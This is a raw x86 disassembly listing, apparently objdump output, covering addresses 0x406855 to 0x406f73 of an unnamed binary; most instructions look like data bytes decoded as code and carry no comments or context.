  406855:	add    BYTE PTR [ecx+0x3c],al
  406858:	add    BYTE PTR [eax],al
  40685a:	add    BYTE PTR [eax],al
  40685c:	xchg   BYTE PTR [eax],cl
  40685e:	loopne 0x40686d
  406860:	imul   ecx,DWORD PTR [eax],0x3c
  406863:	add    BYTE PTR [ecx+0x3c],cl
  406866:	add    BYTE PTR [eax],al
  406868:	add    BYTE PTR [eax],al
  40686a:	xchg   BYTE PTR [eax],cl
  40686c:	cmc    
  40686d:	or     eax,0x3c087c
  406872:	push   ecx
  406873:	cmp    al,0x0
  406875:	add    BYTE PTR [eax],al
  406877:	add    BYTE PTR [esi-0x72f1e8f8],al
  40687d:	or     BYTE PTR [eax+eax*1],bh
  406880:	pop    ecx
  406881:	cmp    al,0x0
  406883:	add    BYTE PTR [eax],al
  406885:	add    BYTE PTR [esi-0x2cf9f6e8],al
  40688b:	add    edi,DWORD PTR [eax+eax*1]
  40688e:	cwde   
  40688f:	cmp    al,0x0
  406891:	add    BYTE PTR [eax],al
  406893:	add    BYTE PTR [esi-0x39f1b0f8],al
  406899:	add    al,0x3c
  40689b:	add    BYTE PTR [eax+0x3c],ah
  4068a1:	add    BYTE PTR [esi-0x39f190f8],al
  4068a7:	add    al,0x3c
  4068a9:	add    BYTE PTR [eax+0x3c],ch
  4068af:	add    BYTE PTR [esi+0x1d085c08],al
  4068b5:	add    eax,0x3cb0003c
  4068ba:	add    BYTE PTR [eax],al
  4068bc:	add    BYTE PTR [eax],al
  4068be:	xchg   BYTE PTR [eax],cl
  4068c0:	mov    cl,BYTE PTR [esi]
  4068c2:	sbb    eax,0xb8003c05
  4068c7:	cmp    al,0x0
  4068c9:	add    BYTE PTR [eax],al
  4068cb:	add    BYTE PTR [esi-0x2cf9f6e8],al
  4068d1:	add    edi,DWORD PTR [eax+eax*1]
  4068d4:	in     al,dx
  4068d5:	cmp    al,0x0
  4068d7:	add    BYTE PTR [eax],al
  4068d9:	add    BYTE PTR [ebx-0x2cf9f6e8],al
  4068df:	add    edi,DWORD PTR [eax+eax*1]
  4068e2:	hlt    
  4068e3:	cmp    al,0x0
  4068e5:	add    BYTE PTR [eax],al
  4068e7:	add    BYTE PTR [ebx-0x46f0eaf8],dl
  4068ed:	or     BYTE PTR [eax+eax*1],bh
  4068f0:	xor    edi,DWORD PTR ds:0x0
  4068f6:	xchg   ebx,eax
  4068f7:	or     BYTE PTR [ecx],ch
  4068f9:	movsx  ecx,BYTE PTR [eax]
  4068fc:	cmp    al,0x0
  4068fe:	cmp    bh,BYTE PTR ds:0x0
  406904:	xchg   ebx,eax
  406905:	or     BYTE PTR ds:0x3c08c30f,dh
  40690b:	add    BYTE PTR [edx+0x3d],al
  40690e:	add    BYTE PTR [eax],al
  406910:	add    BYTE PTR [eax],al
  406912:	xchg   ebx,eax
  406913:	or     BYTE PTR [ecx+0xf],al
  406916:	mov    BYTE PTR [ebx],al
  406918:	cmp    eax,0x3d5800
  40691d:	add    BYTE PTR [eax],al
  40691f:	add    BYTE PTR [ebx-0x77f0a8f8],dl
  406925:	add    edi,DWORD PTR ds:0x3d6e00
  40692b:	add    BYTE PTR [eax],al
  40692d:	add    BYTE PTR [ebx-0x77f089f8],dl
  406933:	add    edi,DWORD PTR ds:0x3d8400
  406939:	add    BYTE PTR [eax],al
  40693b:	add    BYTE PTR [ebx-0x77f079f8],dl
  406941:	add    edi,DWORD PTR ds:0x3d9a00
  406947:	add    BYTE PTR [eax],al
  406949:	add    BYTE PTR [ebx-0x77f062f8],dl
  40694f:	add    edi,DWORD PTR ds:0x3db000
  406955:	add    BYTE PTR [eax],al
  406957:	add    BYTE PTR [ebx-0x77f04cf8],dl
  40695d:	add    edi,DWORD PTR ds:0x3dc600
  406963:	add    BYTE PTR [eax],al
  406965:	add    BYTE PTR [ebx-0x77f032f8],dl
  40696b:	add    edi,DWORD PTR ds:0x3ddc00
  406971:	add    BYTE PTR [eax],al
  406973:	add    BYTE PTR [ebx-0x77f020f8],dl
  406979:	add    edi,DWORD PTR ds:0x3df200
  40697f:	add    BYTE PTR [eax],al
  406981:	add    BYTE PTR [ebx-0x77f00df8],dl
  406987:	add    edi,DWORD PTR ds:0x1000000
  40698d:	add    BYTE PTR [ebp+0x1000010],dh
  406993:	add    BYTE PTR [edx+0x2000010],bh
  406999:	add    cl,al
  40699b:	adc    BYTE PTR [eax],al
  40699d:	add    BYTE PTR [ecx],al
  40699f:	add    BYTE PTR [edx+0x2000010],bh
  4069a5:	add    cl,al
  4069a7:	adc    BYTE PTR [eax],al
  4069a9:	add    BYTE PTR [ecx],al
  4069ab:	add    cl,al
  4069ad:	adc    BYTE PTR [eax],al
  4069af:	add    BYTE PTR [edx],al
  4069b1:	add    al,cl
  4069b3:	adc    BYTE PTR [edx],al
  4069b5:	add    BYTE PTR [ebx],al
  4069b7:	add    bl,dl
  4069b9:	adc    BYTE PTR [edx],al
  4069bb:	add    BYTE PTR [eax+eax*1],al
  4069be:	push   es
  4069bf:	adc    DWORD PTR [eax],eax
  4069c1:	add    BYTE PTR [ecx],al
  4069c3:	add    BYTE PTR [ecx],cl
  4069c5:	adc    DWORD PTR [eax],eax
  4069c7:	add    BYTE PTR [edx],al
  4069c9:	add    BYTE PTR [ebx],cl
  4069cb:	adc    DWORD PTR [eax],eax
  4069cd:	add    BYTE PTR [ecx],al
  4069cf:	add    BYTE PTR [edi],dl
  4069d1:	adc    DWORD PTR [eax],eax
  4069d3:	add    BYTE PTR [edx],al
  4069d5:	add    BYTE PTR [ecx],cl
  4069d7:	adc    DWORD PTR [eax],eax
  4069d9:	add    BYTE PTR [ecx],al
  4069db:	add    BYTE PTR [edi],dl
  4069dd:	adc    DWORD PTR [eax],eax
  4069df:	add    BYTE PTR [edx],al
  4069e1:	add    BYTE PTR [ecx],cl
  4069e3:	adc    DWORD PTR [eax],eax
  4069e5:	add    BYTE PTR [ecx],al
  4069e7:	add    BYTE PTR [edi],dl
  4069e9:	adc    DWORD PTR [eax],eax
  4069eb:	add    BYTE PTR [edx],al
  4069ed:	add    BYTE PTR [ecx],cl
  4069ef:	adc    DWORD PTR [eax],eax
  4069f1:	add    BYTE PTR [ecx],al
  4069f3:	add    BYTE PTR [esi],bl
  4069f5:	adc    DWORD PTR [eax],eax
  4069f7:	add    BYTE PTR [ecx],al
  4069f9:	add    BYTE PTR [ecx+edx*1],ah
  4069fc:	add    BYTE PTR [eax],al
  4069fe:	add    DWORD PTR [eax],eax
  406a00:	and    al,0x11
  406a02:	add    BYTE PTR [eax],al
  406a04:	add    DWORD PTR [eax],eax
  406a06:	push   ds
  406a07:	adc    DWORD PTR [eax],eax
  406a09:	add    BYTE PTR [ecx],al
  406a0b:	add    BYTE PTR [ecx],ch
  406a0d:	adc    DWORD PTR [eax],eax
  406a0f:	add    BYTE PTR [ecx],al
  406a11:	add    BYTE PTR [ecx+edx*1],dh
  406a14:	add    BYTE PTR [eax],al
  406a16:	add    al,BYTE PTR [eax]
  406a18:	inc    ebx
  406a19:	adc    DWORD PTR [eax],eax
  406a1b:	add    BYTE PTR [ecx],al
  406a1d:	add    BYTE PTR [ecx+edx*1],dh
  406a20:	add    BYTE PTR [eax],al
  406a22:	add    al,BYTE PTR [eax]
  406a24:	dec    edx
  406a25:	adc    DWORD PTR [eax],eax
  406a27:	add    BYTE PTR [ecx],al
  406a29:	add    BYTE PTR [ecx+0x11],dl
  406a2c:	add    BYTE PTR [eax],al
  406a2e:	add    al,BYTE PTR [eax]
  406a30:	arpl   WORD PTR [ecx],dx
  406a32:	add    BYTE PTR [eax],al
  406a34:	add    DWORD PTR [eax],eax
  406a36:	jb     0x406a49
  406a38:	add    BYTE PTR [eax],al
  406a3a:	add    al,BYTE PTR [eax]
  406a3c:	push   ecx
  406a3d:	adc    DWORD PTR [eax],eax
  406a3f:	add    BYTE PTR [ebx],al
  406a41:	add    BYTE PTR [ebx+0x11],ah
  406a44:	add    BYTE PTR [eax],al
  406a46:	add    DWORD PTR [eax],eax
  406a48:	jge    0x406a5b
  406a4a:	add    al,BYTE PTR [eax]
  406a4c:	add    al,BYTE PTR [eax]
  406a4e:	adc    DWORD PTR [ecx],0x10000
  406a54:	mov    ch,0x10
  406a56:	add    BYTE PTR [eax],al
  406a58:	add    DWORD PTR [eax],eax
  406a5a:	jge    0x406a6d
  406a5c:	add    BYTE PTR [eax],al
  406a5e:	add    al,BYTE PTR [eax]
  406a60:	adc    DWORD PTR [ecx],0x30000
  406a66:	xchg   DWORD PTR [ecx],edx
  406a68:	add    BYTE PTR [eax],al
  406a6a:	add    al,0x0
  406a6c:	lea    edx,[ecx]
  406a6e:	add    BYTE PTR [eax],al
  406a70:	add    eax,0x119a00
  406a75:	add    BYTE PTR [esi],al
  406a77:	add    BYTE PTR [ecx+edx*1+0x10000],ah
  406a7e:	jge    0x406a91
  406a80:	add    BYTE PTR [eax],al
  406a82:	add    al,BYTE PTR [eax]
  406a84:	adc    DWORD PTR [ecx],0x30000
  406a8a:	xchg   DWORD PTR [ecx],edx
  406a8c:	add    BYTE PTR [eax],al
  406a8e:	add    al,0x0
  406a90:	mov    al,0x11
  406a92:	add    BYTE PTR [eax],al
  406a94:	add    eax,0x119a00
  406a99:	add    BYTE PTR [ecx],al
  406a9b:	add    BYTE PTR [edx+0x2000011],bh
  406aa1:	add    bl,al
  406aa3:	adc    DWORD PTR [eax],eax
  406aa5:	add    BYTE PTR [ebx],al
  406aa7:	add    BYTE PTR [ebp+0x11],bh
  406aaa:	add    BYTE PTR [eax],al
  406aac:	add    DWORD PTR [eax],eax
  406aae:	jge    0x406ac1
  406ab0:	add    BYTE PTR [eax],al
  406ab2:	add    al,BYTE PTR [eax]
  406ab4:	adc    DWORD PTR [ecx],0x30000
  406aba:	xchg   DWORD PTR [ecx],edx
  406abc:	add    BYTE PTR [eax],al
  406abe:	add    al,0x0
  406ac0:	retf   0x11
  406ac3:	add    BYTE PTR ds:0x119a00,al
  406ac9:	add    BYTE PTR [ecx],al
  406acb:	add    BYTE PTR [ebp+0x11],bh
  406ace:	add    BYTE PTR [eax],al
  406ad0:	add    al,BYTE PTR [eax]
  406ad2:	adc    DWORD PTR [ecx],0x30000
  406ad8:	call   0x5100:0x4000011
  406adf:	adc    DWORD PTR [eax],eax
  406ae1:	add    BYTE PTR [ecx],al
  406ae3:	add    BYTE PTR [ebp+0x11],bh
  406ae6:	add    BYTE PTR [eax],al
  406ae8:	add    al,BYTE PTR [eax]
  406aea:	adc    DWORD PTR [ecx],0x10000
  406af0:	push   ds
  406af1:	adc    DWORD PTR [ecx+0x0],edi
  406af4:	or     DWORD PTR [esi],eax
  406af6:	rol    DWORD PTR [ebx],cl
  406af8:	add    DWORD PTR [eax],0x4e20609
  406afe:	mov    DWORD PTR [eax],eax
  406b00:	or     DWORD PTR [esi],eax
  406b02:	ror    DWORD PTR [eax],cl
  406b04:	xchg   ecx,eax
  406b05:	add    BYTE PTR [ecx],cl
  406b07:	push   es
  406b08:	ror    DWORD PTR [eax],cl
  406b0a:	cdq    
  406b0b:	add    BYTE PTR [ecx],cl
  406b0d:	push   es
  406b0e:	ror    DWORD PTR [eax],cl
  406b10:	mov    eax,ds:0xd3060900
  406b15:	or     BYTE PTR [ecx-0x2cf9f700],ch
  406b1b:	or     BYTE PTR [ecx-0x2cf9f700],dh
  406b21:	or     BYTE PTR [ecx-0x2cf9f700],bh
  406b27:	or     cl,al
  406b29:	add    BYTE PTR [ecx],cl
  406b2b:	push   es
  406b2c:	loop   0x406b32
  406b2e:	leave  
  406b2f:	add    BYTE PTR [ecx],cl
  406b31:	push   es
  406b32:	ror    DWORD PTR [eax],cl
  406b34:	rol    DWORD PTR [eax],1
  406b36:	or     DWORD PTR [esi],eax
  406b38:	ror    DWORD PTR [eax],cl
  406b3a:	fld    DWORD PTR [eax]
  406b3c:	or     DWORD PTR [esi],eax
  406b3e:	fmul   DWORD PTR [eax]
  406b40:	jmp    0xde467445
  406b45:	or     cl,bh
  406b47:	add    BYTE PTR [ecx],cl
  406b49:	push   es
  406b4a:	sub    al,BYTE PTR ds:0x6090101
  406b50:	rol    DWORD PTR [ebx],cl
  406b52:	or     al,0x0
  406b54:	aas    
  406b55:	pop    es
  406b56:	fiadd  WORD PTR [ecx+ecx*1]
  406b59:	add    DWORD PTR [eax],edx
  406b5b:	adc    al,0x8c
  406b5d:	or     DWORD PTR [ecx],edx
  406b5f:	add    DWORD PTR [eax],ebx
  406b61:	adc    al,0xd3
  406b63:	or     BYTE PTR [ecx],dh
  406b65:	add    BYTE PTR [ecx],cl
  406b67:	push   es
  406b68:	rol    DWORD PTR [ebx],cl
  406b6a:	sbb    DWORD PTR [ecx],eax
  406b6c:	or     DWORD PTR [esi],eax
  406b6e:	xchg   edx,eax
  406b6f:	or     DWORD PTR [ecx],esp
  406b71:	add    BYTE PTR [eax],dh
  406b73:	adc    al,0xd3
  406b75:	add    esp,DWORD PTR [ecx]
  406b77:	add    BYTE PTR [ebx+0x14],al
  406b7a:	ror    DWORD PTR [eax],cl
  406b7c:	and    DWORD PTR [eax],eax
  406b7e:	push   ebp
  406b7f:	adc    al,0x99
  406b81:	or     DWORD PTR [ecx],esp
  406b83:	add    BYTE PTR [edx+0x14],ch
  406b86:	rol    DWORD PTR [ebx],cl
  406b88:	and    DWORD PTR [ecx],eax
  406b8a:	or     DWORD PTR [esi],eax
  406b8c:	lahf   
  406b8d:	or     DWORD PTR [ecx],ebp
  406b8f:	add    DWORD PTR [ebp+0x1109a514],ebx
  406b95:	add    DWORD PTR [eax],ebx
  406b97:	adc    al,0xac
  406b99:	or     DWORD PTR [ecx],edx
  406b9b:	add    DWORD PTR [eax],ebx
  406b9d:	adc    al,0xb3
  406b9f:	or     DWORD PTR [eax+eax*1],edx
  406ba2:	aas    
  406ba3:	pop    es
  406ba4:	fiadd  WORD PTR [esp+ebx*1]
  406ba7:	add    BYTE PTR [edi],bh
  406ba9:	pop    es
  406baa:	fiadd  WORD PTR [ecx+esi*1]
  406bad:	add    esi,eax
  406baf:	adc    al,0xc6
  406bb1:	or     DWORD PTR [eax+eax*1],ebx
  406bb4:	in     al,dx
  406bb5:	or     BYTE PTR ds:0x37001105,bh
  406bbb:	or     ecx,edi
  406bbd:	or     DWORD PTR [eax+eax*1],esp
  406bc0:	or     DWORD PTR [esi],eax
  406bc2:	lahf   
  406bc3:	or     DWORD PTR [ecx],ebp
  406bc5:	add    edi,esp
  406bc7:	adc    al,0xe0
  406bc9:	or     DWORD PTR [eax+eax*1],edx
  406bcc:	in     al,dx
  406bcd:	or     BYTE PTR ds:0x18011105,bh
  406bd3:	adc    al,0xeb
  406bd5:	or     DWORD PTR [ecx+0x1],ebx
  406bd8:	sub    al,0x15
  406bda:	repz or DWORD PTR [ecx+0x1],esp
  406bde:	xor    eax,0x6109f915
  406be3:	add    DWORD PTR [esi],edi
  406be5:	adc    eax,0x17109fe
  406bea:	arpl   WORD PTR [edi],ax
  406bec:	dec    eax
  406bed:	add    eax,0x15900171
  406bf2:	add    ecx,DWORD PTR [edx]
  406bf4:	jns    0x406bf7
  406bf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bf7:	adc    eax,0x1810a09
  406bfc:	mov    ch,0x15
  406bfe:	(bad)  
  406c00:	or     DWORD PTR [ecx],eax
  406c02:	retf   0x8c15
  406c05:	or     DWORD PTR [ecx+0x4815d401],ecx
  406c0b:	add    eax,0x15e00181
  406c10:	fiadd  WORD PTR [ecx+edx*4]
  406c13:	add    ebp,esi
  406c15:	adc    eax,0x15903d3
  406c1a:	aam    0x15
  406c1c:	dec    eax
  406c1d:	add    eax,0x15fd0021
  406c22:	rol    DWORD PTR [ebx],cl
  406c24:	and    DWORD PTR [eax],eax
  406c26:	push   cs
  406c27:	push   ss
  406c28:	rol    DWORD PTR [ebx],cl
  406c2a:	cdq    
  406c2b:	add    DWORD PTR [eax],esp
  406c2d:	push   ss
  406c2e:	adc    ecx,DWORD PTR [edx]
  406c30:	mov    eax,ds:0x30060901
  406c35:	or     ah,BYTE PTR [ecx+0x36164101]
  406c3b:	or     ah,BYTE PTR [ecx-0x1de9aeff]
  406c41:	add    al,0x2c
  406c43:	add    BYTE PTR [edi+0x16],bl
  406c46:	dec    ecx
  406c47:	or     ch,BYTE PTR [eax+eax*1]
  406c4a:	imul   edx,DWORD PTR [esi],0x2c0542
  406c50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c51:	adc    eax,0x340a4d
  406c56:	mov    ch,0x15
  406c58:	cmp    eax,0x7801a105
  406c5d:	push   ss
  406c5e:	cdq    
  406c5f:	or     DWORD PTR [eax+eax*1],esi
  406c62:	loopne 0x406c79
  406c64:	fiadd  WORD PTR [ecx+eiz*2]
  406c67:	add    BYTE PTR [esi+0x3c0a5f16],al
  406c6d:	add    BYTE PTR [edi],bh
  406c6f:	pop    es
  406c70:	fiadd  WORD PTR [esp+edi*1]
  406c73:	add    ah,ch
  406c75:	or     BYTE PTR ds:0x97003105,bh
  406c7b:	push   ss
  406c7c:	push   0xa
  406c7e:	sub    DWORD PTR [ecx],eax
  406c80:	lods   al,BYTE PTR ds:[esi]
  406c81:	push   ss
  406c82:	jo     0x406c8e
  406c84:	mov    eax,ds:0xd316b601
  406c89:	add    esp,ecx
  406c8b:	add    DWORD PTR [ecx],ecx
  406c8d:	push   es
  406c8e:	cdq    
  406c8f:	or     ecx,ebp
  406c91:	add    DWORD PTR [ecx],ecx
  406c93:	push   es
  406c94:	rol    DWORD PTR [ebx],cl
  406c96:	jmp    0xd357629c
  406c9b:	or     cl,ch
  406c9d:	add    DWORD PTR ds:0xe908d317,eax
  406ca3:	add    DWORD PTR [esi],edx
  406ca5:	pop    ss
  406ca6:	ror    DWORD PTR [eax],cl
  406ca8:	jmp    0xd35792ae
  406cad:	or     cl,ch
  406caf:	add    DWORD PTR [ebx],esi
  406cb1:	pop    ss
  406cb2:	ror    DWORD PTR [eax],cl
  406cb4:	jmp    0xd357aeba
  406cb9:	or     cl,ch
  406cbb:	add    DWORD PTR [eax+0x17],edx
  406cbe:	ror    DWORD PTR [eax],cl
  406cc0:	jmp    0xd357cbc6
  406cc5:	or     cl,ch
  406cc7:	add    DWORD PTR [edi+edx*1-0x71],esi
  406ccb:	or     ch,cl
  406ccd:	add    DWORD PTR [ecx-0x16f72ce9],eax
  406cd3:	add    DWORD PTR [esi+0x3108d317],edx
  406cd9:	add    BYTE PTR [ecx-0xef569e9],ch
  406cdf:	add    DWORD PTR [ecx],ecx
  406ce1:	push   es
  406ce2:	ror    DWORD PTR [eax],cl
  406ce4:	icebp  
  406ce5:	add    eax,edx
  406ce7:	pop    ss
  406ce8:	ror    DWORD PTR [eax],cl
  406cea:	icebp  
  406ceb:	add    esp,esp
  406ced:	pop    ss
  406cee:	dec    eax
  406cef:	add    eax,0x17f701f1
  406cf4:	ror    DWORD PTR [eax],cl
  406cf6:	stc    
  406cf7:	add    DWORD PTR [edi],esi
  406cf9:	sbb    BYTE PTR [eax+0x5],cl
  406cfc:	add    DWORD PTR [edx],eax
  406cfe:	or     DWORD PTR [esi],eax
  406d00:	ror    DWORD PTR [eax],cl
  406d02:	or     DWORD PTR [edx],eax
  406d04:	addr16 sbb bl,dl
  406d07:	add    esi,ecx
  406d09:	add    DWORD PTR [eax+ebx*1+0x48],ebp
  406d0d:	add    eax,0x187b0161
  406d12:	scas   al,BYTE PTR es:[edi]
  406d13:	or     ch,BYTE PTR [ecx+0x1]
  406d16:	test   BYTE PTR [eax],bl
  406d18:	mov    ah,0xa
  406d1a:	or     DWORD PTR [edx],eax
  406d1c:	js     0x406d25
  406d1e:	dec    eax
  406d1f:	add    eax,0x6090211
  406d24:	mov    edx,0x902210a
  406d29:	push   es
  406d2a:	ror    DWORD PTR [edx],0x21
  406d2d:	add    ah,BYTE PTR ds:0x21054819
  406d33:	add    al,BYTE PTR [ecx+0x19]
  406d36:	enter  0x310a,0x2
  406d3a:	xor    eax,0x710ace15
  406d3f:	add    BYTE PTR [edx+0x19],ch
  406d42:	mov    esi,0x8f016908
  406d47:	sbb    ebx,edx
  406d49:	or     al,BYTE PTR [ecx+0x2]
  406d4c:	or     DWORD PTR [esi],eax
  406d4e:	ror    DWORD PTR [eax],cl
  406d50:	dec    ecx
  406d51:	add    bh,BYTE PTR [edi+0x390add19]
  406d57:	add    BYTE PTR [esi+0x8],al
  406d5a:	stc    
  406d5b:	or     al,BYTE PTR [ecx+0x0]
  406d5e:	leave  
  406d5f:	sbb    DWORD PTR [ebx],eax
  406d61:	or     edi,DWORD PTR [ecx]
  406d63:	add    bh,dl
  406d65:	sbb    DWORD PTR [ecx+0xa],ecx
  406d68:	cmp    DWORD PTR [eax],eax
  406d6a:	cmc    
  406d6b:	sbb    DWORD PTR [ecx],ecx
  406d6d:	or     edi,DWORD PTR [ecx]
  406d6f:	add    BYTE PTR [ebx+0x7],ah
  406d72:	dec    eax
  406d73:	add    eax,0x7780039
  406d78:	dec    eax
  406d79:	add    eax,0x19fe0039
  406d7e:	dec    eax
  406d7f:	add    eax,0x14180111
  406d84:	ud2    
  406d86:	jno    0x406d88
  406d88:	adc    bl,BYTE PTR [edx]
  406d8a:	mov    esi,0xfa027108
  406d8f:	or     BYTE PTR [ebx+ecx*1],bl
  406d92:	jno    0x406d96
  406d94:	cli    
  406d95:	or     BYTE PTR [ebx+ecx*1],ah
  406d98:	cmp    DWORD PTR [eax],eax
  406d9a:	das    
  406d9b:	sbb    cl,BYTE PTR [eax+0x5]
  406d9e:	and    DWORD PTR [eax],eax
  406da0:	ds sbb dl,bl
  406da3:	or     BYTE PTR [ecx+0x2],bh
  406da6:	push   edx
  406da7:	sbb    dh,BYTE PTR [eax]
  406da9:	or     edi,DWORD PTR [ecx+0x2]
  406dac:	sbb    dh,BYTE PTR ds:0xc90b
  406db1:	add    BYTE PTR [ebx+0x1a],bh
  406db4:	dec    eax
  406db5:	add    eax,0x1a850169
  406dba:	mov    ah,0xa
  406dbc:	jns    0x406dc0
  406dbe:	xchg   ebx,eax
  406dbf:	sbb    cl,BYTE PTR [eax+0x5]
  406dc2:	add    DWORD PTR [edx],0xb3f1aa5
  406dc8:	mov    cl,0x0
  406dca:	rcr    DWORD PTR [edx],0x48
  406dcd:	add    eax,0x1ada0091
  406dd2:	dec    eax
  406dd3:	add    eax,0x6090009
  406dd8:	rol    DWORD PTR [ebx],cl
  406dda:	sbb    al,0x0
  406ddc:	or     DWORD PTR [esi],eax
  406dde:	rol    DWORD PTR [ebx],cl
  406de0:	or     al,0x0
  406de2:	or     DWORD PTR [esi],eax
  406de4:	rol    DWORD PTR [ebx],cl
  406de6:	inc    esp
  406de7:	add    BYTE PTR [ecx],cl
  406de9:	push   es
  406dea:	rol    DWORD PTR [ebx],cl
  406dec:	dec    esp
  406ded:	add    ch,ch
  406def:	sbb    ch,BYTE PTR [edx+0xb]
  406df2:	dec    esp
  406df3:	add    BYTE PTR [ebx+0x18],bh
  406df6:	jo     0x406e03
  406df8:	dec    esp
  406df9:	add    BYTE PTR [ecx],cl
  406dfb:	push   es
  406dfc:	rol    DWORD PTR [ebx],cl
  406dfe:	push   esp
  406dff:	add    cl,bl
  406e01:	or     BYTE PTR [ecx],bh
  406e03:	add    eax,0x8e00054
  406e08:	fild   DWORD PTR [ecx+ecx*1]
  406e0b:	add    dl,bh
  406e0d:	or     BYTE PTR [eax+0x5],cl
  406e10:	mov    DWORD PTR [edx],eax
  406e12:	or     DWORD PTR [esi],eax
  406e14:	ror    DWORD PTR [eax],cl
  406e16:	icebp  
  406e17:	add    DWORD PTR [ecx],ecx
  406e19:	push   es
  406e1a:	rol    DWORD PTR [ebx],cl
  406e1c:	icebp  
  406e1d:	add    DWORD PTR ds:0x4408d31b,edx
  406e23:	add    BYTE PTR [edi],bh
  406e25:	pop    es
  406e26:	fiadd  WORD PTR [esp+eax*2]
  406e29:	add    ah,ch
  406e2b:	or     BYTE PTR ds:0x2401f105,bh
  406e31:	sbb    ebp,DWORD PTR [edx]
  406e33:	add    eax,0x1b370199
  406e38:	aas    
  406e39:	or     esi,DWORD PTR [ecx+0x2]
  406e3c:	dec    esi
  406e3d:	sbb    eax,DWORD PTR [edx+0x5601f10b]
  406e43:	sbb    esp,edx
  406e45:	add    al,0xf1
  406e47:	add    DWORD PTR [ebp+0x1b],ebp
  406e4a:	ror    DWORD PTR [eax],cl
  406e4c:	icebp  
  406e4d:	add    DWORD PTR [eax+0x1b],edi
  406e50:	ror    DWORD PTR [eax],cl
  406e52:	adc    DWORD PTR [ecx],eax
  406e54:	test   DWORD PTR [ebx],ebx
  406e56:	mov    bl,0x9
  406e58:	or     DWORD PTR [ecx],eax
  406e5a:	xchg   esi,eax
  406e5b:	sbb    edx,DWORD PTR [eax-0x62fd6ef5]
  406e61:	sbb    ecx,DWORD PTR [eax+0x5]
  406e64:	adc    DWORD PTR [ecx],eax
  406e66:	sbb    BYTE PTR [ebx+edx*8],dl
  406e69:	add    ebx,DWORD PTR [eax+eax*1]
  406e6c:	test   BYTE PTR [eax],0x42
  406e6f:	add    eax,0x1ba60169
  406e74:	dec    ecx
  406e75:	or     ch,BYTE PTR [ecx+0x1]
  406e78:	ret    0x9d1b
  406e7b:	or     ebp,DWORD PTR [ecx+0x1]
  406e7e:	int    0x1b
  406e80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e81:	or     ebp,DWORD PTR [ecx+0x1]
  406e84:	xlat   BYTE PTR ds:[ebx]
  406e85:	sbb    ebx,DWORD PTR [ebp-0x9fff3f5]
  406e8b:	or     BYTE PTR [edx+0x5],al
  406e8e:	popa   
  406e8f:	add    dh,bl
  406e91:	sbb    ecx,esp
  406e93:	or     edi,DWORD PTR [eax+eax*1]
  406e96:	test   BYTE PTR [eax],0x42
  406e99:	add    eax,0x6090059
  406e9e:	ror    DWORD PTR [eax],cl
  406ea0:	add    BYTE PTR fs:[ecx+0x16],ch
  406ea4:	inc    edx
  406ea5:	add    eax,0x1bea0169
  406eaa:	popf   
  406eab:	or     ebp,DWORD PTR [ecx+0x1]
  406eae:	int    0x1b
  406eb0:	fimul  WORD PTR [ebx]
  406eb2:	adc    al,0x0
  406eb4:	test   BYTE PTR [eax],0x42
  406eb7:	add    eax,0x8f60044
  406ebc:	inc    edx
  406ebd:	add    eax,0x6090014
  406ec2:	rol    DWORD PTR [ebx],cl
  406ec4:	mov    eax,ds:0x2060902
  406ec9:	or     al,0x64
  406ecb:	add    BYTE PTR [ecx],cl
  406ecd:	push   es
  406ece:	rol    DWORD PTR [ebx],cl
  406ed0:	sub    al,0x0
  406ed2:	or     DWORD PTR [esi],eax
  406ed4:	rol    DWORD PTR [ebx],cl
  406ed6:	cmp    al,0x0
  406ed8:	or     DWORD PTR [esi],eax
  406eda:	rol    DWORD PTR [ebx],cl
  406edc:	mov    cl,0x2
  406ede:	or     DWORD PTR [esi],eax
  406ee0:	cdq    
  406ee1:	or     DWORD PTR [ecx-0x2cf9f6fe],edi
  406ee7:	add    eax,ecx
  406ee9:	add    cl,BYTE PTR [ecx]
  406eeb:	push   es
  406eec:	rol    DWORD PTR [ebx],cl
  406eee:	or     DWORD PTR [eax],eax
  406ef0:	jnp    0x406f0e
  406ef2:	dec    edx
  406ef3:	or     al,0x31
  406ef5:	add    DWORD PTR [ebx+0x690c501c],ecx
  406efb:	add    BYTE PTR [ecx],cl
  406efd:	push   es
  406efe:	push   esi
  406eff:	or     al,0x69
  406f01:	add    BYTE PTR [eax-0x36f39ce4],bl
  406f07:	add    cl,BYTE PTR [ecx]
  406f09:	push   es
  406f0a:	push   0xc
  406f0c:	fld    DWORD PTR [edx]
  406f0e:	or     DWORD PTR [esi],eax
  406f10:	rol    DWORD PTR [ebx],cl
  406f12:	push   cs
  406f13:	add    BYTE PTR [eax+eax*1],al
  406f16:	or     eax,0x8000800
  406f1b:	add    BYTE PTR [ecx],ah
  406f1d:	add    BYTE PTR [eax],cl
  406f1f:	add    BYTE PTR [eax+eax*1],cl
  406f22:	add    BYTE PTR es:[eax],cl
  406f25:	add    BYTE PTR [eax],dl
  406f27:	add    BYTE PTR [ebx],ch
  406f29:	add    BYTE PTR [eax],cl
  406f2b:	add    BYTE PTR [eax+eax*1],dl
  406f2e:	add    BYTE PTR es:[esi],cl
  406f31:	add    BYTE PTR [eax],bl
  406f33:	add    BYTE PTR [eax],dh
  406f35:	add    BYTE PTR [esi],cl
  406f37:	add    BYTE PTR [eax+eax*1],bl
  406f3a:	cmp    DWORD PTR [eax],eax
  406f3c:	push   cs
  406f3d:	add    BYTE PTR [eax],ah
  406f3f:	add    BYTE PTR [edx+0x0],ah
  406f42:	push   cs
  406f43:	add    BYTE PTR [eax+eax*1],ah
  406f46:	cld    
  406f47:	add    BYTE PTR [esi],cl
  406f49:	add    BYTE PTR [eax],ch
  406f4b:	add    BYTE PTR [ebx],bl
  406f4d:	add    DWORD PTR [esi],ecx
  406f4f:	add    BYTE PTR [eax+eax*1],ch
  406f52:	cld    
  406f53:	add    BYTE PTR [esi],cl
  406f55:	add    BYTE PTR [eax],dh
  406f57:	add    BYTE PTR [esi+0x1],cl
  406f5a:	push   cs
  406f5b:	add    BYTE PTR [eax+eax*1],dh
  406f5e:	dec    esi
  406f5f:	add    DWORD PTR [esi],ecx
  406f61:	add    BYTE PTR [eax],bh
  406f63:	add    BYTE PTR [ebp+0x1],dl
  406f66:	push   cs
  406f67:	add    BYTE PTR [eax+eax*1],bh
  406f6a:	pusha  
  406f6b:	add    DWORD PTR [esi],ecx
  406f6d:	add    BYTE PTR [eax+0x0],al
  406f70:	xchg   ebx,eax
  406f71:	add    DWORD PTR [esi],ecx
  406f73:	add    BYTE PTR [eax+eax*1-0x6d],al
